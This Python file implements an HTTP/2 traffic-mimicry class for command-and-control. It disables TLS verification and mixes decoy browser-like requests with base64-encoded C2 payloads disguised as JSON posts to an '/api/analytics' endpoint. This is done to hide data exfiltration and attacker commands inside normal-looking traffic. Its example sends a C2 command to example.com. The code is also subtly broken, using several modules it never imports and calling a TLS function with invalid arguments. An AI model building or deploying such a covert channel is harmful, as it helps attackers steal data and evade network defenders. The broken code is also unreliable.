import h2.connection
import h2.config
import h2.events
import socket
import ssl
import os
import random
import time
import json
from collections import deque
from urllib.parse import urlparse
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

class HTTP2Mimicry:
    def __init__(self, target_url, c2_payload=None):
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        self.host = self.parsed_url.hostname
        self.port = self.parsed_url.port or 443
        self.c2_payload = c2_payload
        self.ssl_context = self.create_ssl_context()
        self.connection = None
        self.socket = None
        self.stream_id = None
        self.legitimate_traffic = deque()
        self.last_request_time = 0
        self.request_interval = 0
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
        ]
        
    def create_ssl_context(self):
        # Generate ephemeral RSA key
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        
        # Create self-signed cert
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Example Inc"),
            x509.NameAttribute(NameOID.COMMON_NAME, self.host),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow()
        ).not_valid_after(
            datetime.datetime.utcnow() + datetime.timedelta(days=1)
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName(self.host)]),
            critical=False,
        ).sign(private_key, hashes.SHA256(), default_backend())
        
        # Create context
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(['h2'])
        
        # Use our ephemeral key
        ctx.load_cert_chain(
            certificate_data=cert.public_bytes(serialization.Encoding.PEM),
            key_data=private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            )
        )
        
        return ctx
    
    def connect(self):
        # Create socket
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(5)
        
        # Wrap with TLS
        tls_sock = self.ssl_context.wrap_socket(
            self.socket, 
            server_hostname=self.host
        )
        tls_sock.connect((self.host, self.port))
        
        # Initialize HTTP/2 connection
        config = h2.config.H2Configuration(client_side=True)
        self.connection = h2.connection.H2Connection(config=config)
        self.connection.initiate_connection()
        tls_sock.sendall(self.connection.data_to_send())
        
        # Read server preface
        preface = tls_sock.recv(65536)
        events = self.connection.receive_data(preface)
        self.socket = tls_sock
        
        # Analyze legitimate traffic patterns
        self.analyze_traffic_patterns()
    
    def analyze_traffic_patterns(self):
        # This would normally observe real traffic, but we simulate
        self.request_interval = random.uniform(3.0, 7.0)  # 3-7 seconds
        
        # Generate legitimate request templates
        self.legitimate_traffic.extend([
            ("GET", "/", {"user-agent": random.choice(self.user_agents)}),
            ("GET", "/styles.css", {"user-agent": random.choice(self.user_agents)}),
            ("GET", "/script.js", {"user-agent": random.choice(self.user_agents)}),
            ("GET", "/favicon.ico", {"user-agent": random.choice(self.user_agents)}),
            ("GET", "/api/data", {"user-agent": random.choice(self.user_agents)}),
            ("POST", "/login", {"user-agent": random.choice(self.user_agents), "content-type": "application/json"})
        ])
    
    def send_legitimate_request(self):
        if not self.legitimate_traffic:
            return False
        
        method, path, headers = self.legitimate_traffic[0]
        self.legitimate_traffic.rotate(-1)  # Move to end
        
        self.stream_id = self.connection.get_next_available_stream_id()
        
        request_headers = [
            (':method', method),
            (':path', path),
            (':scheme', 'https'),
            (':authority', self.host)
        ]
        
        for k, v in headers.items():
            request_headers.append((k, v))
        
        self.connection.send_headers(self.stream_id, request_headers)
        if method == "POST":
            # Send empty data for now
            self.connection.send_data(self.stream_id, b'', end_stream=True)
        else:
            self.connection.end_stream(self.stream_id)
        
        self.socket.sendall(self.connection.data_to_send())
        self.last_request_time = time.time()
        
        # Process response (but ignore content)
        response = self.socket.recv(65536)
        self.connection.receive_data(response)
        
        return True
    
    def send_c2_data(self, data):
        # Encode as base64 to look like regular data
        encoded = base64.b64encode(data).decode()
        
        # Prepare as JSON payload
        payload = json.dumps({
            "userId": random.randint(10000, 99999),
            "sessionToken": "".join(random.choices("abcdef0123456789", k=32)),
            "data": encoded
        }).encode()
        
        # Create new stream
        self.stream_id = self.connection.get_next_available_stream_id()
        
        headers = [
            (':method', 'POST'),
            (':path', '/api/analytics'),
            (':scheme', 'https'),
            (':authority', self.host),
            ('user-agent', random.choice(self.user_agents)),
            ('content-type', 'application/json'),
            ('content-length', str(len(payload)))
        ]
        
        self.connection.send_headers(self.stream_id, headers)
        self.connection.send_data(self.stream_id, payload, end_stream=True)
        self.socket.sendall(self.connection.data_to_send())
        self.last_request_time = time.time()
        
        # Receive response but ignore
        response = self.socket.recv(65536)
        self.connection.receive_data(response)
    
    def run(self):
        self.connect()
        
        # Initial legitimate requests
        for _ in range(3):
            self.send_legitimate_request()
            time.sleep(random.uniform(0.5, 1.5))
        
        # Main loop
        while True:
            elapsed = time.time() - self.last_request_time
            if elapsed >= self.request_interval:
                # Decide if this should be C2 or legitimate
                if self.c2_payload and random.random() < 0.3:  # 30% chance
                    self.send_c2_data(self.c2_payload)
                else:
                    self.send_legitimate_request()
            
            # Process incoming data
            try:
                data = self.socket.recv(65536)
                if not data:
                    break
                    
                events = self.connection.receive_data(data)
                for event in events:
                    if isinstance(event, h2.events.DataReceived):
                        # Reset flow control
                        self.connection.acknowledge_received_data(
                            event.flow_controlled_length, 
                            event.stream_id
                        )
            except socket.timeout:
                pass
            
            time.sleep(0.1)

# Example usage
if __name__ == "__main__":
    # This would contain actual C2 commands
    c2_payload = json.dumps({
        "cmd": "update",
        "payload": "Q29uZmlkZW50aWFsIGRhdGE="
    }).encode()
    
    mimic = HTTP2Mimicry("https://example.com/api", c2_payload)
    mimic.run()